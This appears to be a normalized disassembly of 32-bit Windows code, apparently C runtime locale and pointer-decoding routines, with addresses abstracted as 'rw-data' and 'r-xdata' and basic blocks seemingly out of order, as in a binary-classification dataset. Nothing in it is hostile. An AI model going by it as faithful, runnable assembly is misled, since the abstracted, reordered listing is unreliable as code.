push [ rw-data ]
mov [ rw-data ] esi
call sub_41a3a5
push [ rw-data ]
mov [ rw-data ] esi
call sub_41a3a5
add esp 0x10
mov [ rw-data ] esi
mov al 0x1
pop esi
retn
mov eax [ rw-data ]
mov esi rw-data
cmp eax esi
je r-xdata
push eax
call sub_41a3a5
pop ecx
mov [ rw-data ] esi
sub_417c8d
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
mov eax [ ebp + 0x8 ]
ror eax cl
xor eax [ rw-data ]
pop ebp
retn
sub_417cd9
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ rw-data ]
mov ecx esi
xor esi [ rw-data ]
and ecx 0x1f
ror esi cl
test esi esi
jne r-xdata
push [ ebp + 0x8 ]
mov ecx esi
call [ r--data ]
call esi
pop ecx
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40d56a
mov esp ebp
pop ebp
retn
sub_417d37
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
sub eax esi
add eax 0x3
push edi
xor edi edi
shr eax 0x2
cmp [ ebp + 0xc ] esi
sbb ebx ebx
not ebx
and ebx eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40d56a
mov esp ebp
pop ebp
retn
mov eax [ esi ]
mov [ ebp - 0x8 ] eax
test eax eax
je r-xdata
add esi 0x4
inc edi
cmp edi ebx
jne r-xdata
mov ecx eax
call [ r--data ]
call [ ebp - 0x8 ]
sub_417d93
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ ebp + 0x8 ]
push edi
jmp r-xdata
cmp esi [ ebp + 0xc ]
jne r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
xor eax eax
add esi 0x4
mov ecx edi
call [ r--data ]
call edi
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_40d56a
mov esp ebp
pop ebp
retn
sub_417dd8
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
jne r-xdata
mov eax [ rw-data ]
mov [ ecx ] eax
xor eax eax
pop ebp
retn
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
push 0x16
pop eax
pop ebp
retn
sub_417e04
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x4000
je r-xdata
mov ecx rw-data
xchg [ ecx ] eax
xor eax eax
pop ebp
retn
cmp eax 0x8000
je r-xdata
cmp eax 0x10000
je r-xdata
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
push 0x16
pop eax
pop ebp
retn
sub_417e41
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi eax
and eax 0x3f
sar edi 0x6
imul edx eax 0x30
mov esi [ edi * 4 + rw-data ]
mov al [ esi + edx + 0x28 ]
mov bl [ esi + edx + 0x29 ]
movzx ecx al
and ecx 0x80
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp + 0xc ]
cmp ecx 0x4000
je r-xdata
or al 0x80
mov [ esi + edx + 0x28 ] al
mov ecx [ edi * 4 + rw-data ]
mov [ ecx + edx + 0x29 ] 0x0
cmp ecx 0x8000
je r-xdata
test bl bl
jne r-xdata
mov eax 0x8000
jmp r-xdata
and al 0x7f
mov [ esi + edx + 0x28 ] al
jmp r-xdata
cmp ecx 0x10000
je r-xdata
xor eax eax
cmp bl 0x1
setne al
dec eax
and eax 0x30000
add eax 0x10000
mov eax 0x4000
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
or al 0x80
mov [ esi + edx + 0x28 ] al
mov eax [ edi * 4 + rw-data ]
mov [ eax + edx + 0x29 ] 0x2
jmp r-xdata
cmp ecx 0x20000
je r-xdata
cmp ecx 0x40000
jne r-xdata
or al 0x80
mov [ esi + edx + 0x28 ] al
mov eax [ edi * 4 + rw-data ]
mov [ eax + edx + 0x29 ] 0x1
jmp r-xdata
sub_417f72
push 0x8
push r--data
call sub_40e2a0
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_4191c3
pop ecx
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0xc ]
call sub_418039
mov [ ebp - 0x4 ] 0xfffffffe
call sub_417fa9
call sub_40e2e6
retn 0xc
sub_417fb5
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_417f72
mov esp ebp
pop ebp
retn
sub_417fdd
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push esi
push edi
push 0xb8
push 0x1
mov edi ecx
call sub_41942e
mov esi eax
mov eax [ edi ]
push 0x0
mov [ eax ] esi
call sub_41a3a5
add esp 0xc
test esi esi
je r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov eax [ edi ]
mov [ ebp - 0x14 ] eax
mov eax [ edi + 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ edi + 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ edi + 0xc ]
mov [ ebp - 0x8 ] eax
mov eax [ edi + 0x10 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call sub_417fb5
pop ecx
pop ecx
sub_418039
mov edi edi
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov eax [ eax ]
push [ eax + 0x4c ]
mov eax [ esi ]
push [ eax ]
call sub_4183fb
mov eax [ esi + 0x10 ]
push [ eax ]
mov eax [ esi + 0xc ]
push [ eax ]
mov eax [ esi ]
push [ eax ]
call sub_4189fb
mov ecx [ esi + 0x8 ]
add esp 0x14
mov [ ecx ] eax
test eax eax
je r-xdata
mov eax [ esi ]
push [ eax ]
call sub_420b90
mov eax [ esi ]
push [ eax ]
call sub_4209c4
pop ecx
pop ecx
mov eax [ esi + 0x10 ]
mov eax [ eax ]
test eax eax
je r-xdata
mov eax [ esi ]
push [ eax ]
mov eax [ esi + 0x4 ]
mov eax [ eax ]
add eax 0x4c
push eax
call sub_420c88
mov eax [ esi ]
push [ eax ]
call sub_420b90
mov eax [ esi + 0x4 ]
add esp 0xc
mov eax [ eax ]
test [ eax + 0x350 ] 0x2
jne r-xdata
mov edx rw-data
push edi
pop esi
retn
test [ rw-data ] 0x1
jne r-xdata
sbb eax eax
or eax ecx
test di di
je r-xdata
push [ eax + 0x4c ]
push rw-data
call sub_420c88
mov eax [ rw-data ]
pop ecx
pop ecx
pop esi
mov ecx [ eax + 0x88 ]
mov [ rw-data ] ecx
mov ecx [ eax ]
mov [ rw-data ] ecx
mov eax [ eax + 0x4 ]
mov [ rw-data ] eax
retn
mov eax rw-data
xchg [ eax ] ecx
xor eax eax
jmp r-xdata
mov di [ eax + 0x2 ]
cmp di [ edx + 0x2 ]
jne r-xdata
pop edi
test eax eax
je r-xdata
add eax 0x4
add edx 0x4
test di di
jne r-xdata
mov di [ eax ]
xor ecx ecx
inc ecx
cmp di [ edx ]
jne r-xdata
sub_418137
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push ebx
push 0x55
push [ ebp + 0x8 ]
call sub_41a56a
mov ebx eax
pop ecx
pop ecx
cmp ebx 0x55
jb r-xdata
xor eax eax
pop ebp
retn
lea eax [ ebx * 2 + 0x2 ]
push edi
push eax
call sub_419b3e
mov edi eax
pop ecx
test edi edi
jne r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebx + 0x1 ]
push eax
push [ ebp + 0x8 ]
push eax
push edi
call sub_41f7c7
add esp 0x10
test eax eax
jne r-xdata
pop edi
pop ebx
pop ebp
retn
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_413b2e
int3
mov eax edi
jmp r-xdata
sub_4181a8
push 0x8
push r--data
call sub_40e2a0
mov esi rw-data
cmp [ rw-data ] esi
je r-xdata
call sub_40e2e6
retn
push 0x4
call sub_4191c3
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
push rw-data
call sub_420c88
pop ecx
pop ecx
mov [ rw-data ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4181f1
sub_4181fa
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41a3df
add esp 0xc
xor esi esi
test eax eax
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_413b2e
int3
lea eax [ edi + 0x80 ]
cmp [ eax ] si
je r-xdata
add edi 0x100
cmp [ edi ] si
je r-xdata
push eax
push r--data
push 0x2
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4187a1
add esp 0x14
pop edi
pop esi
pop ebp
retn
push edi
push r--data
push 0x2
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4187a1
add esp 0x14
sub_41826a
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
push 0x1ca
push ebx
push edi
call sub_411230
mov esi [ ebp + 0xc ]
add esp 0xc
movzx eax [ esi ]
test ax ax
jne r-xdata
push 0x2e
pop ecx
cmp ax cx
jne r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x4 ] ebx
lea eax [ esi + 0x2 ]
cmp [ eax ] bx
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
or eax 0xffffffff
lea ecx [ esi + eax * 2 ]
movzx ebx [ ecx ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x4 ]
push 0x2c
pop edx
test ecx ecx
jne r-xdata
push 0xf
push eax
lea eax [ edi + 0x100 ]
push 0x10
push eax
call sub_41f7c7
add esp 0x10
test eax eax
jne r-xdata
cmp ecx 0x1
jne r-xdata
cmp eax 0x40
jae r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ edi + 0x11e ] ax
jmp r-xdata
cmp ecx 0x2
jne r-xdata
cmp eax 0x40
jae r-xdata
push 0x2e
pop ecx
cmp bx cx
je r-xdata
cmp eax 0x10
jae r-xdata
cmp ebx 0x5f
je r-xdata
push eax
push esi
push 0x40
push edi
jmp r-xdata
test bx bx
je r-xdata
push eax
push esi
push 0x40
lea eax [ edi + 0x80 ]
jmp r-xdata
call sub_41f7c7
add esp 0x10
test eax eax
jne r-xdata
push eax
push esi
push 0x10
lea eax [ edi + 0x100 ]
cmp bx dx
jne r-xdata
push eax
xor eax eax
push eax
push eax
push eax
push eax
push eax
jmp r-xdata
push 0x2c
pop eax
cmp bx ax
je r-xdata
call sub_413b2e
int3
test bx bx
je r-xdata
mov esi [ ebp - 0x8 ]
add esi 0x2
inc [ ebp - 0x4 ]
jmp r-xdata
push r--data
push esi
call sub_42075b
pop ecx
pop ecx
test eax eax
je r-xdata
sub_418399
mov edi edi
push ebp
mov ebp esp
push esi
call sub_41aa93
mov edx [ ebp + 0x8 ]
mov esi eax
push 0x0
pop eax
mov ecx [ esi + 0x350 ]
test cl 0x2
sete al
inc eax
cmp edx 0xffffffff
je r-xdata
or [ rw-data ] 0xffffffff
test edx edx
je r-xdata
pop esi
pop ebp
retn
cmp edx 0x1
je r-xdata
or ecx 0x2
cmp edx 0x2
je r-xdata
and ecx 0xfffffffd
jmp r-xdata
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
or eax 0xffffffff
jmp r-xdata
mov [ esi + 0x350 ] ecx
jmp r-xdata
sub_4183fb
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
cmp eax esi
je r-xdata
push edi
push 0x2e
pop ecx
mov edi eax
[ edi ] [ esi ]
and [ eax + 0xc ] 0x0
push eax
call sub_420947
pop ecx
pop edi
sub_41842a
mov edi edi
push ebp
mov ebp esp
sub esp 0x1f4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x1c ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x1e8 ] eax
mov [ ebp - 0x1ec ] ebx
push edi
mov edi [ ebp + 0x14 ]
mov [ ebp - 0x1dc ] edi
test esi esi
jne r-xdata
call sub_41aa93
push 0x55
lea ecx [ eax + 0x68 ]
mov [ ebp - 0x1d8 ] ecx
lea ecx [ eax + 0x6c ]
mov [ ebp - 0x1e0 ] ecx
lea ecx [ eax + 0x172 ]
add eax 0x2a0
mov [ ebp - 0x1d4 ] ecx
push eax
push [ ebp + 0x18 ]
xor ecx ecx
mov [ ebp - 0x1f0 ] eax
push edi
mov [ ebp - 0x1f4 ] ecx
mov [ ebp - 0x1e4 ] ecx
call sub_41f7c7
add esp 0x10
test eax eax
jne r-xdata
xor eax eax
xor eax eax
push eax
push eax
push eax
push eax
push eax
jmp r-xdata
cmp [ esi ] 0x43
jne r-xdata
call sub_413b2e
int3
mov edi esi
xor edx edx
lea ecx [ edi + 0x2 ]
xor edi edi
cmp [ esi + 0x2 ] di
jne r-xdata
mov ax [ edi ]
add edi 0x2
cmp ax dx
jne r-xdata
sub edi ecx
sar edi 0x1
cmp edi 0x83
jae r-xdata
mov esi [ ebp - 0x1e8 ]
push r--data
push [ ebp + 0x10 ]
push esi
call sub_41a3df
add esp 0xc
test eax eax
jne r-xdata
call sub_41c377
xor ebx ebx
test al al
lea eax [ ebp - 0x1d0 ]
push esi
push eax
sete bl
call sub_41826a
pop ecx
pop ecx
test eax eax
jne r-xdata
mov eax [ ebp - 0x1d4 ]
mov ecx esi
push edi
push edi
push edi
push edi
push edi
test ebx ebx
je r-xdata
mov ebx [ ebp - 0x1d8 ]
lea eax [ ebp - 0x1d0 ]
test ebx ebx
mov ebx [ ebp - 0x1d8 ]
push eax
push ebx
push eax
je r-xdata
sbb eax eax
or eax 0x1
test dx dx
je r-xdata
mov eax esi
jmp r-xdata
mov [ ebx ] edi
mov ebx [ ebp - 0x1dc ]
xor esi esi
mov ecx ebx
lea edx [ ecx + 0x2 ]
push 0x2
lea eax [ ebp - 0x1e4 ]
push eax
push 0x20001004
push esi
call sub_41c093
test eax eax
je r-xdata
call sub_4213d6
call sub_421d0e
jmp r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x1e0 ]
mov ecx esi
xor eax eax
jmp r-xdata
mov dx [ eax + 0x2 ]
cmp dx [ ecx + 0x2 ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40d56a
mov esp ebp
pop ebp
retn
mov ax [ ecx ]
add ecx 0x2
cmp ax si
jne r-xdata
sub ecx edx
sar ecx 0x1
lea eax [ ecx + 0x1 ]
push eax
push ebx
push 0x55
push [ ebp - 0x1f0 ]
call sub_41f7c7
add esp 0x10
test eax eax
je r-xdata
call [ GetACP@IAT ]
mov [ ebp - 0x1e4 ] eax
mov eax [ ebp - 0x1e4 ]
test eax eax
jne r-xdata
push esi
call sub_41c1c6
test eax eax
je r-xdata
lea eax [ ebp - 0x1d0 ]
push eax
push 0x83
push [ ebp - 0x1d4 ]
call sub_4181fa
mov ebx [ ebp - 0x1dc ]
add esp 0xc
test ebx ebx
je r-xdata
add esp 0xc
test eax eax
je r-xdata
mov ebx [ ebp - 0x1d4 ]
mov esi [ ebp - 0x1e8 ]
push ebx
push [ ebp + 0x10 ]
push esi
call sub_41a3df
add esp 0xc
test eax eax
jne r-xdata
mov eax [ ebp - 0x1d8 ]
mov eax [ eax ]
mov [ ebx ] eax
sbb eax eax
or eax 0x1
test dx dx
je r-xdata
test eax eax
je r-xdata
add eax 0x4
add ecx 0x4
test dx dx
jne r-xdata
push esi
push esi
push esi
push esi
push esi
jmp r-xdata
push ebx
push esi
push [ ebp + 0x18 ]
push [ ebp - 0x1dc ]
call sub_41f7c7
add esp 0x10
test eax eax
jne r-xdata
movzx eax ax
mov [ ebx ] eax
lea ebx [ edi + 0x1 ]
push ebx
push esi
push 0x83
push [ ebp - 0x1d4 ]
call sub_41f7c7
add esp 0x10
test eax eax
jne r-xdata
xor ebx ebx
cmp [ esi ] bx
je r-xdata
lea ecx [ ebp - 0xb0 ]
lea edx [ ecx + 0x2 ]
mov eax ebx
jmp r-xdata
xor eax eax
jmp r-xdata
mov dx [ eax + 0x2 ]
cmp dx [ ecx + 0x2 ]
jne r-xdata
mov dx [ eax ]
cmp dx [ ecx ]
jne r-xdata
push ebx
push esi
push 0x55
push [ ebp - 0x1f0 ]
mov eax [ ebp - 0x1e0 ]
xor ecx ecx
mov [ eax ] cx
mov ecx 0x83
cmp edi ecx
jae r-xdata
mov ax [ ecx ]
add ecx 0x2
cmp ax [ ebp - 0x1f4 ]
jne r-xdata
sub ecx edx
sar ecx 0x1
lea eax [ ecx + 0x1 ]
push eax
lea eax [ ebp - 0xb0 ]
push eax
push [ ebp + 0x18 ]
push ebx
jmp r-xdata
test eax eax
je r-xdata
add eax 0x4
add ecx 0x4
test dx dx
jne r-xdata
lea eax [ edi + 0x1 ]
push eax
push esi
push ecx
push [ ebp - 0x1e0 ]
call sub_41f7c7
add esp 0x10
test eax eax
je r-xdata
call sub_41f7c7
add esp 0x10
test eax eax
jne r-xdata
mov dx [ eax ]
cmp dx [ ecx ]
jne r-xdata
mov ebx [ ebp - 0x1ec ]
push ebx
push ebx
push ebx
push ebx
push ebx
jmp r-xdata
sub_4187a1
mov edi edi
push ebp
mov ebp esp
push ebx
xor ebx ebx
push esi
mov esi ebx
cmp [ ebp + 0x10 ] ebx
jle r-xdata
pop esi
pop ebx
pop ebp
retn
push edi
lea edi [ ebp + 0x10 ]
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_413b2e
int3
inc esi
cmp esi [ ebp + 0x10 ]
jl r-xdata
lea edi [ edi + 0x4 ]
push [ edi ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41f685
add esp 0xc
test eax eax
jne r-xdata
pop edi
sub_4187e2
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
and [ ebp - 0xc ] 0x0
and [ ebp - 0x10 ] 0x0
cmp [ ebp + 0x8 ] 0x5
jbe r-xdata
call sub_41aa93
mov [ ebp - 0x8 ] eax
call sub_420c11
mov eax [ ebp - 0x8 ]
lea ecx [ ebp - 0x1 ]
or [ eax + 0x350 ] 0x10
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0xc ]
mov [ ebp - 0x20 ] eax
lea eax [ ebp + 0x8 ]
mov [ ebp - 0x1c ] eax
lea eax [ ebp + 0xc ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x1 ]
push eax
call sub_417f37
mov eax [ ebp - 0xc ]
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
xor eax eax
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_418862
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
xor esi esi
inc esi
push 0x6a6
mov [ ebp - 0x8 ] esi
call sub_419b3e
mov ebx eax
xor eax eax
pop ecx
test ebx ebx
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push edi
lea edi [ ebx + 0x4 ]
mov [ edi ] ax
mov [ ebx ] esi
mov esi [ ebp + 0x8 ]
lea eax [ esi + 0x30 ]
push [ eax ]
mov [ ebp - 0xc ] eax
push r--data
push [ r--data ]
push 0x3
push 0x351
push edi
call sub_4187a1
mov eax r--data
add esp 0x18
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_413b2e
int3
mov eax [ ebp - 0xc ]
lea ecx [ eax + 0x10 ]
mov eax [ eax ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
sbb eax eax
or eax 0x1
test dx dx
je r-xdata
push r--data
push 0x351
push edi
call sub_41f685
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov dx [ eax + 0x2 ]
cmp dx [ ecx + 0x2 ]
jne r-xdata
push ebx
call sub_41a3a5
pop ecx
mov ecx [ esi + 0x28 ]
or edi 0xffffffff
test ecx ecx
je r-xdata
mov ecx [ esi + 0x28 ]
or edi 0xffffffff
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x4 ]
neg eax
sbb eax eax
add ecx 0xc
not eax
mov [ ebp - 0x4 ] ecx
and [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0xc ] eax
push [ eax ]
push r--data
push [ ecx ]
push 0x3
push 0x351
push edi
call sub_4187a1
mov eax [ ebp - 0x4 ]
add esp 0x18
cmp eax r--data
jl r-xdata
add eax 0x4
add ecx 0x4
test dx dx
jne r-xdata
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax edi
[ ecx ] eax
jne r-xdata
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax edi
[ ecx ] eax
jne r-xdata
mov dx [ eax ]
cmp dx [ ecx ]
jne r-xdata
xor eax eax
mov [ esi + 0x24 ] eax
mov [ esi + 0x1c ] eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x20 ] eax
mov eax [ esi + 0x40 ]
jmp r-xdata
[ eax ] edi
dec edi
jne r-xdata
push [ esi + 0x28 ]
call sub_41a3a5
pop ecx
and [ esi + 0x24 ] 0x0
lea eax [ ebx + 0x4 ]
and [ esi + 0x1c ] 0x0
mov [ esi + 0x28 ] ebx
mov [ esi + 0x20 ] eax
[ eax ] edi
dec edi
jne r-xdata
push [ esi + 0x28 ]
call sub_41a3a5
pop ecx
pop edi
push [ esi + 0x24 ]
call sub_41a3a5
pop ecx
push [ esi + 0x24 ]
call sub_41a3a5
pop ecx
sub_4189fb
mov edi edi
push ebp
mov ebp esp
sub esp 0x1d0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x1c8 ] edi
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x1c0 ] 0x1
mov [ ebp - 0x1cc ] eax
mov ebx eax
mov [ ebp - 0x1bc ] ebx
test esi esi
je r-xdata
test esi esi
je r-xdata
push edi
call sub_418862
pop ecx
cmp [ esi ] 0x4c
jne r-xdata
add eax 0x2
add eax eax
mov eax [ edi + eax * 8 ]
jmp r-xdata
push esi
push eax
push edi
call sub_418ce0
add esp 0xc
jmp r-xdata
push eax
push 0x55
lea eax [ ebp - 0x1b8 ]
push eax
push 0x83
lea eax [ ebp - 0x10c ]
push eax
push esi
call sub_41842a
add esp 0x18
test eax eax
je r-xdata
cmp [ esi + 0x2 ] 0x43
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40d56a
mov esp ebp
pop ebp
retn
xor ecx ecx
lea edx [ edi + 0x20 ]
mov esi ecx
mov [ ebp - 0x1bc ] edx
cmp [ esi + 0x4 ] 0x5f
jne r-xdata
mov eax [ ebp - 0x1c0 ]
mov ecx [ edx ]
lea eax [ ebp - 0x10c ]
push r--data
push esi
call sub_4207e5
mov ebx eax
mov [ ebp - 0x1d0 ] ebx
pop ecx
pop ecx
test ebx ebx
je r-xdata
test esi esi
je r-xdata
test eax eax
jne r-xdata
sbb eax eax
or eax 0x1
xor ecx ecx
cmp [ eax ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
sub eax esi
sar eax 0x1
mov [ ebp - 0x1c0 ] eax
je r-xdata
test ebx ebx
inc ebx
lea eax [ ebp - 0x10c ]
push eax
push esi
push edi
call sub_418ce0
mov edx [ ebp - 0x1bc ]
add esp 0xc
test eax eax
je r-xdata
xor ecx ecx
mov eax ecx
jmp r-xdata
mov dx [ eax + 0x2 ]
cmp dx [ ecx + 0x2 ]
mov [ ebp - 0x1c2 ] dx
mov edx [ ebp - 0x1bc ]
jne r-xdata
push 0x3b
pop eax
cmp [ ebx ] ax
je r-xdata
mov eax ecx
jmp r-xdata
xor ecx ecx
mov eax ecx
mov [ ebp - 0x1c0 ] eax
jmp r-xdata
inc ebx
xor ecx ecx
jmp r-xdata
test eax eax
je r-xdata
add eax 0x4
add ecx 0x4
cmp [ ebp - 0x1c2 ] 0x0
jne r-xdata
mov edi [ ebp - 0x1c0 ]
mov ebx r--data
mov [ ebp - 0x1c4 ] 0x1
inc esi
add edx 0x10
mov [ ebp - 0x1bc ] edx
cmp esi 0x5
jle r-xdata
mov di [ eax ]
cmp di [ ecx ]
mov edi [ ebp - 0x1c8 ]
jne r-xdata
inc [ ebp - 0x1c4 ]
add ebx 0xc
cmp ebx r--data
jle r-xdata
mov ecx [ ebx ]
lea edx [ ecx + 0x2 ]
push edi
push esi
push [ ebx ]
call sub_4207ab
add esp 0xc
test eax eax
jne r-xdata
mov ebx [ ebp - 0x1d0 ]
add ebx 0x2
push r--data
push ebx
call sub_42075b
mov edi [ ebp - 0x1c8 ]
mov esi eax
pop ecx
pop ecx
test esi esi
jne r-xdata
mov ax [ ecx ]
add ecx 0x2
cmp ax [ ebp - 0x1cc ]
jne r-xdata
sub ecx edx
sar ecx 0x1
cmp edi ecx
je r-xdata
cmp [ ebp - 0x1c4 ] 0x5
jg r-xdata
push 0x3b
pop eax
cmp [ ebx ] ax
jne r-xdata
mov eax [ ebp - 0x1bc ]
push esi
push ebx
lea eax [ ebp - 0x10c ]
push 0x83
push eax
call sub_41f7c7
add esp 0x10
test eax eax
jne r-xdata
test eax eax
jmp r-xdata
add esi 0x2
cmp [ esi ] cx
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_413b2e
int3
lea eax [ esi + esi ]
cmp eax 0x106
jae r-xdata
jne r-xdata
call sub_40dde3
xor ecx ecx
mov [ ebp + eax - 0x10c ] cx
lea eax [ ebp - 0x10c ]
push eax
push [ ebp - 0x1c4 ]
push edi
call sub_418ce0
add esp 0xc
test eax eax
mov eax [ ebp - 0x1bc ]
je r-xdata
lea esi [ ebx + esi * 2 ]
xor ecx ecx
cmp [ esi ] cx
je r-xdata
inc eax
mov [ ebp - 0x1bc ] eax
jmp r-xdata
sub_418ce0
mov edi edi
push ebp
mov ebp esp
sub esp 0x2e4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x2e4 ] ebx
call sub_41aa93
add eax 0x278
mov [ ebp - 0x2d4 ] eax
lea eax [ ebp - 0x2c0 ]
push eax
push 0x55
lea eax [ ebp - 0x2b8 ]
push eax
push 0x83
lea eax [ ebp - 0x10c ]
push eax
push esi
call sub_41842a
add esp 0x18
test eax eax
jne r-xdata
lea esi [ ebx + 0x2 ]
shl esi 0x4
lea eax [ ebp - 0x10c ]
mov [ ebp - 0x2c8 ] esi
mov edx [ esi + edi ]
mov ecx edx
xor eax eax
sbb eax eax
or eax 0x1
cmp [ eax ] 0x0
je r-xdata
lea ecx [ ebp - 0x10c ]
lea edx [ ecx + 0x2 ]
mov eax edx
jmp r-xdata
mov eax [ ebp - 0x2bc ]
jmp r-xdata
mov si [ eax + 0x2 ]
cmp si [ ecx + 0x2 ]
mov [ ebp - 0x2c2 ] si
mov esi [ ebp - 0x2c8 ]
jne r-xdata
mov ax [ ecx ]
add ecx 0x2
cmp ax [ ebp - 0x2bc ]
jne r-xdata
sub ecx edx
sar ecx 0x1
lea eax [ ecx + 0x1 ]
mov [ ebp - 0x2cc ] eax
lea eax [ eax * 2 + 0x4 ]
push eax
call sub_419b3e
mov [ ebp - 0x2d8 ] eax
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40d56a
mov esp ebp
pop ebp
retn
test eax eax
jne r-xdata
add eax 0x4
add ecx 0x4
cmp [ ebp - 0x2c2 ] 0x0
jne r-xdata
mov ecx [ esi + edi ]
add eax 0x4
mov [ ebp - 0x2d0 ] ecx
mov ecx [ edi + ebx * 4 + 0xa0 ]
mov [ ebp - 0x2dc ] ecx
mov ecx [ edi + 0x8 ]
mov [ ebp - 0x2e0 ] ecx
lea ecx [ ebp - 0x10c ]
push ecx
push [ ebp - 0x2cc ]
mov [ ebp - 0x2c4 ] eax
push eax
call sub_41a3df
add esp 0xc
test eax eax
jne r-xdata
mov si [ eax ]
and [ ebp - 0x2bc ] 0x0
cmp si [ ecx ]
mov esi [ ebp - 0x2c8 ]
jne r-xdata
mov eax [ ebp - 0x2bc ]
push eax
push eax
push eax
push eax
push eax
call sub_413b2e
int3
cmp [ ebp - 0x10c ] 0x43
mov eax [ ebp - 0x2c4 ]
